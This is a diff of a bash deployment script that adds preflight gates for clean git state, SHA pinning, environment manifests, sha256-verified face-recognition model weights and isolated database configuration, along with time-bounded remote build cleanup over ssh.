+  # stderr stays out of $dirty so a git warning on success is not read as a change.
+  dirty="$(git -C "${REPO_ROOT}" status --porcelain --untracked-files=normal -- "${DEPLOY_CLEAN_PATHS[@]}" 2>/dev/null)" || {
+    git -C "${REPO_ROOT}" status --porcelain -- "${DEPLOY_CLEAN_PATHS[@]}" >/dev/null || true
+    fail "git status failed for deploy inputs (${REPO_ROOT})"
+  }
+  if [[ -n "$dirty" ]]; then
+    warn "Deploy inputs have uncommitted changes:"
+    printf '%s\n' "$dirty" | head -20 >&2 || true
+    # dev-fir is a dev-tier env (feature-branch workflow): same dirty-tree policy as dev.
+    if [[ "$env" == "dev" || "$env" == "dev-fir" || "$env" == "dev-auraface" ]] && [[ "${ACX_ALLOW_DIRTY:-0}" == "1" ]]; then
+      warn "Continuing for ${env} (ACX_ALLOW_DIRTY=1)."
+    elif [[ "$env" == "dev" || "$env" == "dev-fir" || "$env" == "dev-auraface" ]]; then
+      warn "Commit them, or re-run with ACX_ALLOW_DIRTY=1 to override."
+      fail "dirty deploy inputs (${env})"
+    else
+      fail "Deploy inputs must be clean for ${env} deploys."
+    fi
+  fi
+}
+preflight_branch_synced() {
+  local env="$1"
+  # dev + dev-fir are developed from feature branches; skip origin/main sync.
+  [[ "$env" == "dev" || "$env" == "dev-fir" || "$env" == "dev-auraface" ]] && return 0
+  local head upstream fetch_err fetch_rc fetch_first_line
+  if fetch_err="$(git -C "${REPO_ROOT}" fetch origin main 2>&1 >/dev/null)"; then
+    fetch_rc=0
+  else
+    fetch_rc=$?
+  fi
+  if [[ "$fetch_rc" -ne 0 && "$GIT_REF_EXPLICIT" == "0" ]]; then
+    fetch_first_line="${fetch_err%%$'\n'*}"
+    fail "git fetch origin main failed (${fetch_first_line}); cannot prove DEPLOY_SHA is the latest main for ${env}. Restore access to origin, or deploy an explicit reviewed ref with GIT_REF=<sha>."
+  fi
+  head="$(git -C "${REPO_ROOT}" rev-parse HEAD 2>/dev/null)" || fail "Could not resolve HEAD in ${REPO_ROOT}"
+  upstream="$(git -C "${REPO_ROOT}" rev-parse --verify --quiet origin/main 2>/dev/null || echo unknown)"
+  if [[ "$fetch_rc" -ne 0 ]]; then
+    warn "git fetch origin main failed; checking ancestry against cached origin/main (${upstream:0:8})"
+  fi
+  if [[ -z "$upstream" || "$upstream" == "unknown" ]]; then
+    fail "Could not resolve origin/main; refusing production deploy with unknown upstream."
+  fi
+  if [[ "$head" != "$DEPLOY_SHA" ]]; then
+    fail "HEAD (${head:0:8}) != DEPLOY_SHA (${DEPLOY_SHA:0:8}). Run from a checkout or detached worktree at that SHA."
+  fi
+  if [[ "$GIT_REF_EXPLICIT" == "0" ]]; then
+    if [[ "$DEPLOY_SHA" != "$upstream" ]]; then
+      fail "DEPLOY_SHA (${DEPLOY_SHA:0:8}) != origin/main (${upstream:0:8}). Pull/push first."
+    fi
+  else
+    if ! git -C "${REPO_ROOT}" merge-base --is-ancestor "$DEPLOY_SHA" origin/main; then
+      fail "DEPLOY_SHA (${DEPLOY_SHA:0:8}) is not an ancestor of origin/main (${upstream:0:8}); refusing historical deploy."
+    fi
+    if [[ "$DEPLOY_SHA" != "$upstream" ]]; then
+      warn "deploying historical ${DEPLOY_SHA:0:8}; origin/main is ${upstream:0:8}"
+    fi
+  fi
+}
+
+preflight_env_manifest() {
+  local env="$1" manifest_env target status rerun_command enabled="${ACX_ENV_PREFLIGHT-1}"
+  local -a command
+
+  case "$enabled" in
+    1) ;;
+    0)
+      log "Skipping environment manifest preflight (ACX_ENV_PREFLIGHT is 0)"
+      return 0
+      ;;
+    *) fail "Invalid ACX_ENV_PREFLIGHT value '${enabled}' (expected 0 or 1)" ;;
+  esac
+
+  case "$env" in
+    dev | staging | prod)
+      manifest_env="$env"
+      target="svc-vm"
+      ;;
+    dev-fir)
+      manifest_env="fir"
+      target="svc-fir"
+      ;;
+    dev-auraface | staging-auraface | prod-auraface)
+      # Dedicated Aura target; it must be registered in config/env/manifest.d/targets.toml
+      # (materialize_remote.sh refuses an unregistered target, so this fails closed).
+      manifest_env="$env"
+      target="svc-auraface"
+      ;;
+    *)
+      fail "Unknown deploy environment for manifest preflight: ${env}"
+      ;;
+  esac
+
+  command=(bash "${REPO_ROOT}/scripts/env/materialize_remote.sh" "$manifest_env" "$target" --check)
+  if "${command[@]}"; then
+    return 0
+  else
+    status=$?
+    printf -v rerun_command '%q ' "${command[@]}"
+    rerun_command="${rerun_command% }"
+    fail "Environment manifest preflight failed for ${env} (exit ${status}). Re-run: ${rerun_command}"
+  fi
+}
+
+pin_deploy_sha() {
+  local resolved
+  if [[ ${DEPLOY_SHA+x} == x ]]; then
+    if [[ ! "$DEPLOY_SHA" =~ ^[0-9a-f]{40}$ ]]; then
+      fail "DEPLOY_SHA must be a full lowercase 40-character commit SHA (got: ${DEPLOY_SHA:-empty})"
+    fi
+    if ! resolved="$(git -C "${REPO_ROOT}" rev-parse --verify --quiet "${DEPLOY_SHA}^{commit}" 2>/dev/null)"; then
+      fail "Could not resolve pre-set DEPLOY_SHA=${DEPLOY_SHA} as a commit"
+    fi
+    if [[ "$resolved" != "$DEPLOY_SHA" ]]; then
+      fail "Pre-set DEPLOY_SHA=${DEPLOY_SHA} did not resolve exactly (got: ${resolved:-empty})"
+    fi
+  else
+    if ! resolved="$(git -C "${REPO_ROOT}" rev-parse --verify --quiet "${GIT_REF}^{commit}" 2>/dev/null)"; then
+      fail "Could not resolve GIT_REF=${GIT_REF} to a commit for DEPLOY_SHA"
+    fi
+    if [[ ! "$resolved" =~ ^[0-9a-f]{40}$ ]]; then
+      fail "GIT_REF=${GIT_REF} did not resolve to a full commit SHA for DEPLOY_SHA (got: ${resolved:-empty})"
+    fi
+    DEPLOY_SHA="$resolved"
+  fi
+  readonly DEPLOY_SHA
+}
+
+materialize_deploy_snapshot() {
+  local cmd="${1:-}" env="${2:-}" snapshot_dir
+  pin_deploy_sha
+  if [[ -n "${DEPLOY_SNAPSHOT_DIR}" ]]; then
+    return 0
+  fi
+  if [[ "${ACX_ALLOW_DIRTY:-0}" == "1" ]]; then
+    case "${cmd}" in
+      build | build-remote)
+        warn "ACX_ALLOW_DIRTY=1: building the live working tree; image is labelled ${DEPLOY_SHA:0:8} but may include uncommitted changes"
+        return 0
+        ;;
+      deploy | prepare-producer)
+        case "${env}" in
+          dev | dev-fir | dev-auraface)
+            warn "ACX_ALLOW_DIRTY=1: building the live working tree; image is labelled ${DEPLOY_SHA:0:8} but may include uncommitted changes"
+            return 0
+            ;;
+        esac
+        ;;
+    esac
+  fi
+  if ! snapshot_dir="$(mktemp -d "${TMPDIR:-/tmp}/acx-deploy-src.XXXXXX")"; then
+    fail "Could not create a private DEPLOY_SHA build snapshot"
+  fi
+  if ! git -C "${REPO_ROOT}" archive --format=tar "${DEPLOY_SHA}" -- \
+    apps/prototype-description-service \
+    scripts/deploy/gpu-snapshot-deployments.conf \
+    scripts/deploy/check-gpu-snapshots.sh | tar -x -C "${snapshot_dir}"; then
+    rm -rf -- "${snapshot_dir}"
+    fail "Could not extract DEPLOY_SHA=${DEPLOY_SHA} into a private build snapshot"
+  fi
+  if [[ ! -f "${snapshot_dir}/apps/prototype-description-service/Dockerfile" ]]; then
+    rm -rf -- "${snapshot_dir}"
+    fail "DEPLOY_SHA=${DEPLOY_SHA} snapshot is missing apps/prototype-description-service/Dockerfile"
+  fi
+  if [[ ! -f "${snapshot_dir}/scripts/deploy/gpu-snapshot-deployments.conf" ]]; then
+    rm -rf -- "${snapshot_dir}"
+    fail "DEPLOY_SHA=${DEPLOY_SHA} snapshot is missing scripts/deploy/gpu-snapshot-deployments.conf"
+  fi
+  if [[ ! -f "${snapshot_dir}/scripts/deploy/check-gpu-snapshots.sh" ]]; then
+    rm -rf -- "${snapshot_dir}"
+    fail "DEPLOY_SHA=${DEPLOY_SHA} snapshot is missing scripts/deploy/check-gpu-snapshots.sh"
+  fi
+  SERVICE_DIR="${snapshot_dir}/apps/prototype-description-service"
+  DEPLOY_SNAPSHOT_DIR="${snapshot_dir}"
+  DEPLOY_ASSETS_DIR="${snapshot_dir}/scripts/deploy"
+  log "Build context: DEPLOY_SHA=${DEPLOY_SHA:0:8} snapshot ${snapshot_dir}"
+  install_deploy_interrupt_traps
+}
+
+# FIR stack volume-mounts YuNet+SFace ONNX (not baked
+# in; rsync excludes them). Deploy/promote/reset must fail closed if the host
+# volume is empty or the bytes do not match the sha256 pins in
+# recognition/infrastructure/face_pipeline/provenance.py MODEL_MANIFEST.
+# Format: filename:sha256 (hex). Keep in lockstep with MODEL_MANIFEST.
+FACE_PIPELINE_ONNX_SHA256=(
+  "face_detection_yunet_2026may.onnx:ebafce4e3c118d6554634be5c27ab333b4c047a9a8c3faf1d7cf93101c22f0f0"
+  "face_recognition_sface_2021dec.onnx:0ba9fbfa01b5270c96627c4ef784da859931e02f04419c829e83484087c34e79"
+)
+# AuraFace (512d) profile: YuNet detector, glintr100 embedder and both license
+# files. SFace must never satisfy this profile. Keep in lockstep with
+# provenance.py MODEL_MANIFEST["yunet"], ["auraface"] (sha256 and license_sha256).
+FACE_PIPELINE_AURAFACE_SHA256=(
+  "face_detection_yunet_2026may.onnx:ebafce4e3c118d6554634be5c27ab333b4c047a9a8c3faf1d7cf93101c22f0f0"
+  "LICENSE.yunet:c83b8120c50ccbd4c4f96edf53141bdd566ebb8f8e9227e415326aa1b1aba958"
+  "glintr100.onnx:a7933ea5330113b01c9b60351d8f4c33003f145d8470ac5f0e52ee2effe25c60"
+  "LICENSE.auraface.md:609e2cb599f84aaa41d8ef29d8fdb04d164fab22e8d9292ca34a599d0f56a338"
+)
+
+# sha256 of a local file. sha256sum is Linux/macOS-15+; older macOS only has
+# shasum. verify_face_pipeline_models_dir inlines the same fallback on purpose —
+# it is shipped to the remote via declare -f and must stay self-contained.
+_local_sha256() {
+  if command -v sha256sum >/dev/null 2>&1; then
+    sha256sum "$1" | awk '{print $1}'
+  else
+    shasum -a 256 "$1" | awk '{print $1}'
+  fi
+}
+
+# Host-local integrity check for face_pipeline ONNX weights (C-07 extractable body).
+# Args: models_dir. Prints OK on success; DIR_FAIL:/FILE_FAIL:/HASH_FAIL: + exit 1 otherwise.
+# Sourced by tests and shipped to the remote via declare -f for preflight.
+verify_face_pipeline_models_dir() {
+  local models_dir="${1:?models_dir required}" profile="${2:-fir}"
+  local entry f expected actual
+  local -a pins
+  if [[ "${profile}" == auraface ]]; then
+    pins=("${FACE_PIPELINE_AURAFACE_SHA256[@]}")
+  elif [[ "$profile" == fir ]]; then
+    pins=("${FACE_PIPELINE_ONNX_SHA256[@]}")
+  else
+    echo "PROFILE_FAIL:$profile"
+    return 1
+  fi
+  if [[ ! -d "${models_dir}" ]] || [[ ! -r "${models_dir}" ]]; then
+    echo "DIR_FAIL:${models_dir}"
+    return 1
+  fi
+  for entry in "${pins[@]}"; do
+    f="${entry%%:*}"
+    expected="${entry#*:}"
+    if [[ ! -f "${models_dir}/${f}" ]] || [[ ! -r "${models_dir}/${f}" ]]; then
+      echo "FILE_FAIL:${f}:${models_dir}"
+      return 1
+    fi
+    # Prefer sha256sum (Linux); fall back to shasum -a 256 (macOS).
+    if command -v sha256sum >/dev/null 2>&1; then
+      actual="$(sha256sum "${models_dir}/${f}" | awk '{print $1}')"
+    else
+      actual="$(shasum -a 256 "${models_dir}/${f}" | awk '{print $1}')"
+    fi
+    if [[ "${actual}" != "${expected}" ]]; then
+      echo "HASH_FAIL:${f}:${models_dir}:expected=${expected}:actual=${actual}"
+      return 1
+    fi
+  done
+  echo OK
+  return 0
+}
+
+# Read KEY=VALUE from remote_dir/.env. Value is taken verbatim to end-of-line
+# after the first '=' (C-05); one matching pair of surrounding quotes is stripped.
+# Missing key → empty string (exit 0). SSH failure → fail closed (C-06).
+_remote_dotenv_value() {
+  local remote_dir="$1" key="$2" raw rc=0 timeout="${3:-}"
+  [[ -n "$timeout" ]] || timeout="$(validated_deadline ACX_REMOTE_INSPECT_TIMEOUT 60)" || return 1
+  # Remote `|| true` only covers a missing key / missing file (grep exit 1).
+  # Local ssh failure is NOT swallowed.
+  if [[ -n "${timeout}" ]]; then
+    raw="$(run_with_deadline "${timeout}" "remote ${key} read" \
+      ssh -o BatchMode=yes -o ConnectTimeout="${timeout}" -o ConnectionAttempts=1 \
+      -o ServerAliveInterval="${timeout}" -o ServerAliveCountMax=1 \
+      -l "${OCI_USER}" -- "${OCI_HOST}" \
+      "grep -E '^${key}=' '${remote_dir}/.env' 2>/dev/null | tail -1 | cut -d= -f2- || true")" || rc=$?
+  else
+    raw="$(ssh -o BatchMode=yes -o ConnectTimeout=5 -l "${OCI_USER}" -- "${OCI_HOST}" \
+      "grep -E '^${key}=' '${remote_dir}/.env' 2>/dev/null | tail -1 | cut -d= -f2- || true")" || rc=$?
+  fi
+  if ((rc != 0)); then
+    if [[ -n "${timeout}" ]]; then
+      warn "ssh failed reading ${key} from ${remote_dir}/.env on ${SSH_TARGET} (exit ${rc})"
+      return "${rc}"
+    fi
+    fail "ssh failed reading ${key} from ${remote_dir}/.env on ${SSH_TARGET} (exit ${rc})"
+  fi
+  # Strip one layer of surrounding double or single quotes only.
+  if [[ ${#raw} -ge 2 && "${raw}" == \"*\" ]]; then
+    raw="${raw:1:${#raw}-2}"
+  elif [[ ${#raw} -ge 2 && "${raw}" == \'*\' ]]; then
+    raw="${raw:1:${#raw}-2}"
+  fi
+  printf '%s' "$raw"
+}
+
+# Bounded multi-key .env read: one ssh round trip for every requested key, so a
+# preflight works from one consistent view of the file. Prints KEY=VALUE for each
+# key in argument order (VALUE empty when missing; last occurrence wins; one layer
+# of matching quotes stripped, as in _remote_dotenv_value). An ssh failure returns
+# its status; it is never treated as an absent key.
+_remote_dotenv_snapshot() {
+  local remote_dir="$1" timeout="$2" key raw value line rc=0 pattern=""
+  shift 2
+  for key in "$@"; do
+    pattern+="${pattern:+|}${key}"
+  done
+  raw="$(run_with_deadline "${timeout}" "remote .env snapshot read" \
+    ssh -o BatchMode=yes -o ConnectTimeout="${timeout}" -o ConnectionAttempts=1 \
+    -o ServerAliveInterval="${timeout}" -o ServerAliveCountMax=1 \
+    -l "${OCI_USER}" -- "${OCI_HOST}" \
+    "test -f '${remote_dir}/.env' && { grep -E '^(${pattern})=' '${remote_dir}/.env'; rc=\$?; [ \"\$rc\" -le 1 ]; }")" || rc=$?
+  if ((rc != 0)); then
+    return "${rc}"
+  fi
+  for key in "$@"; do
+    value=""
+    local occurrences=0
+    while IFS= read -r line; do
+      if [[ "${line}" == "${key}="* ]]; then
+        occurrences=$((occurrences + 1))
+        value="${line#"${key}="}"
+      fi
+    done <<<"${raw}"
+    case "$key" in
+      POSTGRES_USER | POSTGRES_DB | POSTGRES_DSN | POSTGRES_SYNC_DSN)
+        ((occurrences <= 1)) || {
+          warn "ambiguous duplicate database configuration"
+          return 2
+        }
+        ;;
+    esac
+    if [[ ${#value} -ge 2 && "${value}" == \"*\" ]]; then
+      value="${value:1:${#value}-2}"
+    elif [[ ${#value} -ge 2 && "${value}" == \'*\' ]]; then
+      value="${value:1:${#value}-2}"
+    fi
+    printf '%s=%s\n' "${key}" "${value}"
+  done
+}
+
+# Look up one key in a _remote_dotenv_snapshot result; empty when absent.
+_dotenv_snapshot_get() {
+  local snapshot="$1" key="$2" line
+  while IFS= read -r line; do
+    if [[ "${line}" == "${key}="* ]]; then
+      printf '%s\n' "${line#"${key}="}"
+      return 0
+    fi
+  done <<<"${snapshot}"
+  return 0
+}
+
+# Cutover compose interpolates ${ACX_IMAGE_TAG} from remote_dir/.env, while
+# do_restart / promote / rollback retag env_to_tag <env>. Refuse before compose
+# up when the file disagrees (FIR512-3-HR-02). Uses _remote_dotenv_value so
+# this does not add a new ssh protocol.
+# Image-tag gate over one already-read .env snapshot (see _remote_dotenv_snapshot).
+assert_snapshot_image_tag() {
+  local env="$1" snapshot="$2" remote_dir expected file_tag
+  remote_dir="$(env_to_remote_dir "$env")" || return 1
+  expected="$(env_to_tag "$env")" || return 1
+  file_tag="$(_dotenv_snapshot_get "${snapshot}" ACX_IMAGE_TAG)"
+  if [[ "${file_tag}" != "${expected}" ]]; then
+    fail "ACX_IMAGE_TAG=${file_tag:-<empty>} in ${remote_dir}/.env does not match env_to_tag(${env})=${expected}; refusing compose up. Set ACX_IMAGE_TAG=${expected} in ${remote_dir}/.env"
+  fi
+}
+
+assert_remote_env_image_tag() {
+  local env="$1" remote_dir timeout file_tag
+  remote_dir="$(env_to_remote_dir "$env")" || return 1
+  timeout="$(validated_deadline ACX_REMOTE_INSPECT_TIMEOUT 60)" || return 1
+  file_tag="$(_remote_dotenv_value "$remote_dir" ACX_IMAGE_TAG "$timeout")" || return $?
+  assert_snapshot_image_tag "$env" "ACX_IMAGE_TAG=$file_tag"
+}
+
+# Admit only an explicit single-store URL subset whose identity is the same in
+# SQLAlchemy asyncpg and psycopg connect arguments. Query keys override authority
+# fields in those drivers (and libpq has service/hostaddr/options indirection).
+# Refuse that entire ambiguous surface; never print a DSN or parser exception.
+assert_aura_database_identity() {
+  local env="$1" snapshot="$2"
+  printf '%s\n' "$snapshot" | python3 -c '
+import re, sys
+from urllib.parse import unquote, urlsplit
+
+def check():
+    env=sys.argv[1]
+    values=dict(line.split("=",1) for line in sys.stdin.read().split("\n") if "=" in line)
+    role="acx_"+env.replace("-","_")
+    database="alt_context_"+env.replace("-","_")
+    if values.get("POSTGRES_USER") != role or values.get("POSTGRES_DB") != database:
+        return False
+    for key,driver in (("POSTGRES_DSN","postgresql+asyncpg"),
+                       ("POSTGRES_SYNC_DSN","postgresql+psycopg")):
+        raw=values.get(key,"")
+        if not raw or any(ord(c) <= 32 or ord(c) >= 127 for c in raw): return False
+        if re.search(r"%(?![0-9a-fA-F]{2})",raw) or "?" in raw or "#" in raw: return False
+        if not raw.startswith(driver+"://"): return False
+        url=urlsplit(raw)
+        if url.scheme != driver or url.netloc.count("@") != 1: return False
+        credentials,authority=url.netloc.split("@")
+        if ":" not in credentials or authority != "postgres:5432": return False
+        user,password=credentials.split(":",1)
+        if not password or unquote(user,errors="strict") != role: return False
+        # SQLAlchemy decodes credentials but keeps the database path literal.
+        # Escaped database names select a different store, even if unquote agrees.
+        if url.path != "/"+database: return False
+    return True
+
+try:
+    valid=check()
+except (ValueError,UnicodeError):
+    valid=False
+if not valid:
+    print("Aura database identity refused: require explicit isolated async/sync roles, database, postgres:5432 and no query overrides",file=sys.stderr)
+sys.exit(0 if valid else 1)
+' "$env"
+}
+
+preflight_remote_face_pipeline_models() {
+  local env="$1" profile="" timeout
+  # dev-fir verifies the FIR (YuNet+SFace) bundle; Aura tiers verify the AuraFace
+  # bundle. Every other target has no host-mounted face weights and keeps only the
+  # existing image-tag gate before compose up.
+  case "$env" in
+    dev-fir) profile=fir ;;
+    dev-auraface | staging-auraface | prod-auraface) profile=auraface ;;
+    *)
+      assert_remote_env_image_tag "$env" || return $?
+      return 0
+      ;;
+  esac
+  timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120)"
+
+  local remote_dir models_dir_cfg models_path models_dir remote_out remote_err remote_err_file
+  local remote_diagnostic remote_diagnostic_sanitized remote_rc=0
+  local profile_cfg dim_cfg aura_models_cfg snapshot
+  local -a aura_store_keys=()
+  if [[ "$profile" == auraface ]]; then
+    aura_store_keys=(POSTGRES_USER POSTGRES_DB POSTGRES_DSN POSTGRES_SYNC_DSN)
+  fi
+  remote_dir="$(env_to_remote_dir "$env")" || return 1
+
+  # Authoritative models dir is RECOGNITION_FACE_PIPELINE_MODELS_DIR [sr-007] (C-10).
+  # When it is the in-container path under the compose mount
+  # (${ACX_MODELS_PATH}:/data/cache), map to the host volume root for the check.
+  # One bounded .env snapshot (single ssh round trip) gives the image-tag gate and
+  # every face_pipeline key from one consistent read; an unreadable target fails closed.
+  snapshot="$(_remote_dotenv_snapshot "$remote_dir" "${timeout}" \
+    ACX_IMAGE_TAG ACX_MODELS_PATH RECOGNITION_FACE_PIPELINE_MODELS_DIR \
+    RECOGNITION_FACE_PIPELINE_PROFILE PGVECTOR_DIM RECOGNITION_AURAFACE_MODELS_DIR \
+    ACX_ENV COMPOSE_PROJECT_NAME ACX_NETWORK_NAME ACX_PGDATA_PATH \
+    RECOGNITION_AUTH_ENABLED RECOGNITION_ADMIN_ENABLED "${aura_store_keys[@]}")" ||
+    fail "could not read face_pipeline configuration from ${remote_dir}/.env on ${SSH_TARGET}; cannot verify face_pipeline models"
+  assert_snapshot_image_tag "$env" "$snapshot"
+  models_dir_cfg="$(_dotenv_snapshot_get "${snapshot}" RECOGNITION_FACE_PIPELINE_MODELS_DIR)"
+  if [[ -z "${models_dir_cfg}" ]]; then
+    fail "RECOGNITION_FACE_PIPELINE_MODELS_DIR missing or unreadable in ${remote_dir}/.env on ${SSH_TARGET}; cannot verify face_pipeline models"
+  fi
+  if [[ "${profile}" == auraface ]]; then
+    # [EMB-01] One embedding space per comparison (Foundations of Vector
+    # Retrieval, ch. 1): width alone cannot identify an isolated Aura stack.
+    local key expected actual
+    for key in ACX_ENV COMPOSE_PROJECT_NAME ACX_NETWORK_NAME ACX_PGDATA_PATH ACX_MODELS_PATH RECOGNITION_AUTH_ENABLED RECOGNITION_ADMIN_ENABLED; do
+      case "$key" in
+        ACX_ENV) expected="$env" ;;
+        COMPOSE_PROJECT_NAME) expected="acx-$env" ;;
+        ACX_NETWORK_NAME) expected="acx-$env-net" ;;
+        ACX_PGDATA_PATH) expected="/opt/acx-backend/data/$env-pgdata" ;;
+        ACX_MODELS_PATH) expected="/opt/acx-backend/data/$env-models" ;;
+        RECOGNITION_AUTH_ENABLED) expected=true ;;
+        RECOGNITION_ADMIN_ENABLED) expected=false ;;
+      esac
+      actual="$(_dotenv_snapshot_get "$snapshot" "$key")"
+      [[ "$actual" == "$expected" ]] || fail "${env} requires its isolated ${key} configuration; refusing cross-stack or unsafe configuration"
+    done
+    assert_aura_database_identity "$env" "$snapshot" || fail "${env} database isolation admission failed"
+    profile_cfg="$(_dotenv_snapshot_get "${snapshot}" RECOGNITION_FACE_PIPELINE_PROFILE)"
+    dim_cfg="$(_dotenv_snapshot_get "${snapshot}" PGVECTOR_DIM)"
+    aura_models_cfg="$(_dotenv_snapshot_get "${snapshot}" RECOGNITION_AURAFACE_MODELS_DIR)"
+    [[ "${profile_cfg}" == auraface ]] ||
+      fail "RECOGNITION_FACE_PIPELINE_PROFILE=${profile_cfg:-<empty>} in ${remote_dir}/.env; ${env} requires auraface"
+    [[ "${dim_cfg}" == 512 ]] ||
+      fail "PGVECTOR_DIM=${dim_cfg:-<empty>} in ${remote_dir}/.env; ${env} requires 512"
+    [[ "${aura_models_cfg}" == "${models_dir_cfg}" ]] ||
+      fail "RECOGNITION_AURAFACE_MODELS_DIR=${aura_models_cfg:-<empty>} must equal RECOGNITION_FACE_PIPELINE_MODELS_DIR=${models_dir_cfg} in ${remote_dir}/.env"
+  fi
+  if [[ "${models_dir_cfg}" == /data/cache || "${models_dir_cfg}" == /data/cache/* ]]; then
+    models_path="$(_dotenv_snapshot_get "${snapshot}" ACX_MODELS_PATH)"
+    if [[ -z "${models_path}" ]]; then
+      fail "ACX_MODELS_PATH missing or unreadable in ${remote_dir}/.env on ${SSH_TARGET}; cannot map RECOGNITION_FACE_PIPELINE_MODELS_DIR=${models_dir_cfg} to host path"
+    fi
+    models_dir="${models_path}${models_dir_cfg#/data/cache}"
+  else
+    # The container only mounts ${ACX_MODELS_PATH}:/data/cache. A models dir
+    # outside /data/cache may verify fine on the host yet be invisible to the
+    # container at runtime — fail closed instead of green-lighting an
+    # unloadable config (gate r0811864a B-02).
+    fail "RECOGNITION_FACE_PIPELINE_MODELS_DIR=${models_dir_cfg} is outside the container mount /data/cache; the api container cannot load models from host-only paths. Set it to /data/cache[/subdir] in ${remote_dir}/.env"
+  fi
+
+  # Ship the extractable verify body to the remote and execute it (C-07/C-11).
+  # The remote run is wall-clock bounded by the validated command deadline, so a
+  # stalled verification yields a nonzero status instead of an unbounded wait.
+  # Capture stdout even when the remote check exits non-zero; do not swallow
+  # unrelated ssh failures with `|| true` (C-06).
+  remote_err_file="$(mktemp)" || fail "could not capture face_pipeline preflight diagnostic"
+  remote_out="$(
+    run_with_deadline "${timeout}" "face_pipeline model verification for ${env}" \
+      ssh -o BatchMode=yes -o ConnectTimeout=5 -o ConnectionAttempts=1 \
+      -l "${OCI_USER}" -- "${OCI_HOST}" \
+      "bash -s" 2>"${remote_err_file}" <<REMOTE
+set -euo pipefail
+$(declare -p FACE_PIPELINE_ONNX_SHA256 FACE_PIPELINE_AURAFACE_SHA256)
+$(declare -f verify_face_pipeline_models_dir)
+verify_face_pipeline_models_dir $(printf '%q' "${models_dir}") ${profile}
+REMOTE
+  )" || remote_rc=$?
+  remote_err="$(cat "${remote_err_file}")"
+  rm -f "${remote_err_file}"
+  remote_diagnostic="${remote_out}"
+  if [[ -n "${remote_err}" ]]; then
+    remote_diagnostic+=$'\n'"${remote_err}"
+  fi
+
+  if [[ "${remote_out}" == "OK" && "${remote_rc}" -eq 0 ]]; then
+    if [[ -n "${remote_err}" ]] && ! printf '%s\n' "${remote_err}" | sanitize_deploy_diagnostic >&2; then
+      echo "diagnostic: face_pipeline preflight diagnostic unavailable" >&2
+    fi
+    log "face_pipeline ONNX weights present and sha256-verified under ${models_dir}"
+    return 0
+  fi
+  remote_diagnostic_sanitized="$(printf '%s\n' "${remote_diagnostic:-no remote response}" | sanitize_deploy_diagnostic)" ||
+    remote_diagnostic_sanitized="diagnostic: remote preflight diagnostic unavailable"
+  if [[ "${remote_out}" == DIR_FAIL:* ]]; then
+    fail "face_pipeline models directory missing or unreadable on ${SSH_TARGET}; remote diagnostic follows: ${remote_diagnostic_sanitized}"
+  fi
+  if [[ "${remote_out}" == FILE_FAIL:* ]]; then
+    fail "missing face_pipeline ONNX weight on ${SSH_TARGET}; remote diagnostic follows: ${remote_diagnostic_sanitized}"
+  fi
+  if [[ "${remote_out}" == HASH_FAIL:* ]]; then
+    fail "face_pipeline ONNX integrity check failed on ${SSH_TARGET}; remote diagnostic follows: ${remote_diagnostic_sanitized}"
+  fi
+  if ((remote_rc != 0)); then
+    fail "face_pipeline models preflight ssh/remote failed for ${env} (exit ${remote_rc}, looked under ${models_dir} on ${SSH_TARGET}); remote diagnostic follows: ${remote_diagnostic_sanitized}"
+  fi
+  fail "face_pipeline models preflight failed for ${env} (looked under ${models_dir} on ${SSH_TARGET}); remote diagnostic follows: ${remote_diagnostic_sanitized}"
+}
+
+#---------------------------------------------------------------- build
+# Optional --target flag from ACX_BUILD_TARGET (empty = last stage).
+_build_target_args() {
+  if [[ -n "${ACX_BUILD_TARGET}" ]]; then
+    assert_safe_shell_token "ACX_BUILD_TARGET" "${ACX_BUILD_TARGET}"
+    printf -- '--target %s' "${ACX_BUILD_TARGET}"
+  fi
+}
+
+remote_build_remaining() {
+  local phase="${1:-remote BuildKit phase}" elapsed remaining
+  elapsed=$((SECONDS - remote_build_started))
+  remaining=$((remote_build_timeout - elapsed))
+  if ((remaining < 1)); then
+    warn "Remote build budget exhausted before ${phase}"
+    return 1
+  fi
+  printf '%s\n' "${remaining}"
+}
+
+remote_build_phase_timeout() {
+  local phase="$1" cap="$2" remaining
+  remaining="$(remote_build_remaining "${phase}")" || return
+  if ((remaining > cap)); then
+    remaining="${cap}"
+  fi
+  printf '%s\n' "${remaining}"
+}
+
+remote_build_root() {
+  local build_root="${REMOTE_BUILD_DIR}"
+  while [[ "${build_root}" == */ && "${build_root}" != "/" ]]; do
+    build_root="${build_root%/}"
+  done
+  printf '%s\n' "${build_root}"
+}
+
+remote_build_cleanup_generation() {
+  local build_dir="$1" command_timeout="$2" cleanup_timeout
+  if cleanup_timeout="$(remote_build_phase_timeout "remote generation directory cleanup" "${command_timeout}")"; then
+    run_with_deadline "${cleanup_timeout}" "remote generation directory cleanup" \
+      ssh -l "${OCI_USER}" -- "${OCI_HOST}" "rm -rf -- '$(remote_quote "${build_dir}")'" ||
+      warn "Could not clean remote generation directory ${build_dir}"
+  else
+    warn "Remote build budget exhausted; generation directory may remain: ${build_dir}"
+  fi
+  if [[ "${ACX_REMOTE_BUILD_GENERATION_DIR:-}" == "${build_dir}" ]]; then
+    ACX_REMOTE_BUILD_GENERATION_DIR=""
+  fi
+}
+
+cleanup_remote_build_generation_on_exit() {
+  local build_dir="${ACX_REMOTE_BUILD_GENERATION_DIR:-}" command_timeout ttl build_root
+  [[ -n "${build_dir}" ]] || return 0
+  ttl="${ACX_REMOTE_BUILD_GENERATION_TTL_MINUTES:-360}"
+  build_root="$(remote_build_root)"
+  if [[ "${build_dir}" != "${build_root}-"* ||
+    ! "${build_dir}" =~ ^[A-Za-z0-9_./-]+$ ]]; then
+    warn "Refusing remote cleanup for unsafe generation directory ${build_dir}"
+    ACX_REMOTE_BUILD_GENERATION_DIR=""
+    return 0
+  fi
+  command_timeout="$(validated_deadline ACX_REMOTE_COMMAND_TIMEOUT 120 2>/dev/null)" || command_timeout=120
+  if ((command_timeout > 30)); then
+    command_timeout=30
+  fi
+  if ! run_with_deadline "${command_timeout}" "remote generation directory cleanup" \
+    ssh -l "${OCI_USER}" -- "${OCI_HOST}" "rm -rf -- '$(remote_quote "${build_dir}")'"; then
+    warn "remote build generation ${build_dir} may remain; the next remote build reaps it after ${ttl} minutes"
+  fi
+  ACX_REMOTE_BUILD_GENERATION_DIR=""
+}
+
+do_build() {
+  preflight_docker
+  local sha tag target_args
+  pin_deploy_sha
+  sha="${DEPLOY_SHA}"
+  tag="${1:-dev}"
+  assert_safe_shell_token "image tag" "${tag}"
+  assert_safe_image_repo "IMAGE_BASE" "${IMAGE_BASE}"
